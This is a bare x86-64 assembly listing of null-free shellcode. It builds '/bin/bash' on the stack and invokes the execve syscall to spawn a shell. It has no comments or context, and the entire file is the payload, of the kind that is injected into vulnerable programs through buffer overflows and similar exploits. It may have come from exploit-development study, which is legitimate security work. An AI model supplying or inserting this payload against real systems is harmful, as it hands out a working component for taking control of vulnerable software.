section .text
  global _start
    _start:
      xor rdx,rdx
      push rdx
      mov rax,'h#######'
      shl rax,56
      shr rax,56
      push rax
      mov rdi,rsp
      mov rax,'/bin/bas'
      push rax
      mov rdi,rsp
      push rdx
      push rdi
      mov rsi,rsp
      xor rax,rax
      mov al,0x3b
      syscall

